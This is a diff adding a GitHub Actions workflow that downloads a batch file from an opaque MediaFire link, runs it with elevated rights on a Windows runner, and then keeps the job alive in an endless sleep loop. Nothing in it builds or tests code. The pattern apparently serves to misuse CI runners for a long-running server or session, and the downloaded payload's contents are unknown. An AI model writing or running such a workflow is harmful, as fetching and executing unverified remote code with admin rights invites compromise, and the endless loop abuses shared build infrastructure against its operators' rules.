@@ -1,0 +1,19 @@
+name: TINO_DEV
+
+on: [push, workflow_dispatch]
+
+jobs:
+  run-batch:
+    runs-on: windows-2025
+    steps:
+      - name: Loading SERVER
+        run: |
+          Invoke-WebRequest -Uri "https://download1349.mediafire.com/suu9p068syqgOhjHfPykyhwjenmrLE4sh05nNmeXn-PJSGoGHZbeXne9RKA6yKSVt79lqAFu2ndVDvxzVxbDMQve9KhlRnNK3V9z5wl7xpkVgQm2CKlHaOZYVW4wzZp1l8FXAob3zO5I-EcOUU5kR1C0XLifXrAcA8LVJ9f__CK2/tcmynwyb3aeo94n/run.bat" -OutFile run.bat
+
+      - name: SETUP SERVER
+        run: |
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c run.bat" -Verb RunAs
+
+      - name: Keep process alive
+        run: |
+          while ($true) { Start-Sleep -Seconds 3600 }
